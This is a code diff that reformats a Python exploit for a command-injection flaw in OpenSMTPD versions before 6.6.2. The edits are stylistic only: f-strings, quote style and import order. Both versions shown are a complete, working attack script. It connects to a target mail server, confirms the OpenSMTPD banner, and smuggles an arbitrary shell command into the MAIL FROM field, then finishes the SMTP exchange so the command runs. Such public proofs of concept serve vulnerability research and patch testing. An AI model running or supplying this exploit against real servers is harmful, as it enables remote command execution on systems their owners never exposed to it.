@@ -13,15 +13,15 @@
 # OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
 # escape dangerous characters from user-controlled input. An attacker
 # can exploit this to execute arbitrary shell commands on the target.
-# 
+#
 #!/usr/local/bin/python3
 
-from socket import *
 import sys
+from socket import *
 
 if len(sys.argv) != 4:
-    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
-    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
+    print(f"Usage {sys.argv[0]} <target ip> <target port> <command>")
+    print(f"E.g. {sys.argv[0]} 127.0.0.1 25 'touch /tmp/x'")
     sys.exit(1)
 
 ADDR = sys.argv[1]
@@ -32,37 +32,38 @@ s = socket(AF_INET, SOCK_STREAM)
 s.connect((ADDR, PORT))
 
 res = s.recv(1024)
-if 'OpenSMTPD' not in str(res):
-    print('[!] No OpenSMTPD detected')
-    print('[!] Received {}'.format(str(res)))
-    print('[!] Exiting...')
+if "OpenSMTPD" not in str(res):
+    print("[!] No OpenSMTPD detected")
+    print(f"[!] Received {res!s}")
+    print("[!] Exiting...")
     sys.exit(1)
 
-print('[*] OpenSMTPD detected')
-s.send(b'HELO x\r\n')
+print("[*] OpenSMTPD detected")
+s.send(b"HELO x\r\n")
 res = s.recv(1024)
-if '250' not in str(res):
-    print('[!] Error connecting, expected 250')
-    print('[!] Received: {}'.format(str(res)))
-    print('[!] Exiting...')
+if "250" not in str(res):
+    print("[!] Error connecting, expected 250")
+    print(f"[!] Received: {res!s}")
+    print("[!] Exiting...")
     sys.exit(1)
 
-print('[*] Connected, sending payload')
-s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
+print("[*] Connected, sending payload")
+s.send(bytes(f"MAIL FROM:<;{CMD};>\r\n", "utf-8"))
 res = s.recv(1024)
-if '250' not in str(res):
-    print('[!] Error sending payload, expected 250')
-    print('[!] Received: {}'.format(str(res)))
-    print('[!] Exiting...')
+if "250" not in str(res):
+    print("[!] Error sending payload, expected 250")
+    print(f"[!] Received: {res!s}")
+    print("[!] Exiting...")
     sys.exit(1)
 
-print('[*] Payload sent')
-s.send(b'RCPT TO:<root>\r\n')
+print("[*] Payload sent")
+s.send(b"RCPT TO:<root>\r\n")
 s.recv(1024)
-s.send(b'DATA\r\n')
+s.send(b"DATA\r\n")
 s.recv(1024)
-s.send(b'\r\nxxx\r\n.\r\n')
+s.send(b"\r\nxxx\r\n.\r\n")
 s.recv(1024)
-s.send(b'QUIT\r\n')
+s.send(b"QUIT\r\n")
 s.recv(1024)
-print('[*] Done')
+print("[*] Done")
+
